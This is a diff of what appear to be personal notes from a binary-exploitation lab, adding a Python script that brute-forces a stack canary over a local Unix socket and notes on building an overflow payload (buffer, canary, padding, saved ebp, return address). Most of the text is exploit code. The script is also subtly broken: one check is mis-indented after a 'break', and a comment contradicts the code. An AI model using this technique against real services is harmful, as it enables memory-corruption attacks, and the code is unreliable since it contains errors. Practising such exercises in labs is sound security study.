@@ -120,10 +120,94 @@ let me check overwriting it
 
 # Finding the canary 
 
-![[Pasted image 20260710181453.png]]
+``` 
 
 
-![[Pasted image 20260710180137.png]]
+import socket  
+import os  
+import sys  
+  
+# Expand the tilde (~) if present to ensure the path is absolute  
+socket_path = os.path.expanduser("~/judge_sock")  
+OFFSET_TO_CANARY = 256  
+  
+def test_payload(payload):  
+    try:  
+        # Establish connection to the local service  
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  
+        s.connect(socket_path)  
+          
+        # Dispatch test sequence  
+        s.sendall(payload)  
+          
+        # Check response behavior to see if child survived  
+        response = s.recv(1024)  
+        s.close()  
+          
+        # If the server responds instead of resetting, the canary byte is intact  
+        return len(response) > 0  
+    except (socket.error, ConnectionResetError, BrokenPipeError):  
+        # A crash indicates a canary mismatch triggering termination  
+        return False  
+  
+def run_extraction():  
+    print(f"[*] Beginning canary brute-force targeting: {socket_path}")  
+      
+    # Initialize prefix with the known Linux x86 null byte  
+    prefix = bytearray([])  
+      
+    # Loop to find the remaining 3 bytes of the 32-bit canary  
+    for byte_num in range(2, 5):  
+        print(f"[*] Searching for canary byte #{byte_num}...")  
+        byte_found = False  
+        for candidate in range(256):  
+            # Formulate the trial prefix using currently found bytes + the guess  
+            current_guess = prefix + bytes([candidate])  
+              
+            # Construct the payload using your defined layout  
+            payload = b"A" * (OFFSET_TO_CANARY)  
+            payload += b"\n"  
+            payload += current_guess  
+              
+            # Send and evaluate process survival  
+            if test_payload(payload):  
+                prefix.append(candidate)  
+                print(f"[+] Discovered byte #{byte_num}: {hex(candidate)}")  
+                byte_found = True  
+                break  # Progress to the next byte position  
+                if not byte_found:  
+            print("[-] Error: Could not determine byte value. Server state may have shifted.")  
+            sys.exit(1)  
+              
+    # Format and present the final result  
+    final_canary = bytes(prefix)  
+  
+    # Build final payload using the recovered canary  
+    final_payload = b"A" * (OFFSET_TO_CANARY)  
+    final_payload += b"\n"  
+    final_payload += final_canary  
+  
+    print("\n" + "="*40)  
+    print(f"[+] SUCCESS! Full Canary Extracted: 0x{final_canary.hex()}")  
+    print("="*40)  
+  
+    print("\n[+] Final payload (hex):")  
+    print(final_payload.hex())  
+  
+    print("\n[+] Final payload length:")  
+    print(len(final_payload))  
+  
+    return final_payload  
+  
+  
+  
+if __name__ == "__main__":  
+    run_extraction()
+    
+```
+
+
+
 
 
 Important thing to remember is that the canary will change everytime you run the program. 
@@ -431,3 +515,10 @@ and in the anime.c there are all the functions.
 
 offset + base address = RETURN
 
+What I am passing here is basically 
+256 buffer + canary + padding 8 bytes + saved ebp
+![[Pasted image 20260712171833.png]]
+
+# Saved ebp 
+
+![[Pasted image 20260712175525.png]]
